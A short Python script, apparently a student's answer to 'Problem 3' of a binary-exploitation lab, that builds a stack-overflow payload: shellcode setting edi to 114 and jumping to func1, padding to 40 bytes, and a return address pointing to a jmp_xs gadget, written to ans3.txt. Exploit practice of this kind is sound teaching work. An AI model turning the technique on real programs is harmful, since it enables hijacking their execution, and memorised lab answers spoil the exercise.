# build_payload3.py
import struct

# 1. 构造 Shellcode (设置 rdi=114, 跳转到 func1)
# \xbf\x72\x00\x00\x00 -> mov edi, 0x72
# \x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00 -> mov rax, 0x401216
# \xff\xe0 -> jmp rax
shellcode = b"\xbf\x72\x00\x00\x00" + \
            b"\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00" + \
            b"\xff\xe0"

# 2. 填充到 40 字节 (32字节buffer + 8字节saved rbp)
padding = shellcode + b"A" * (40 - len(shellcode))

# 3. 目标跳转地址: jmp_xs 的地址
jmp_xs_addr = struct.pack("<Q", 0x401334)

payload = padding + jmp_xs_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem 3 written to ans3.txt")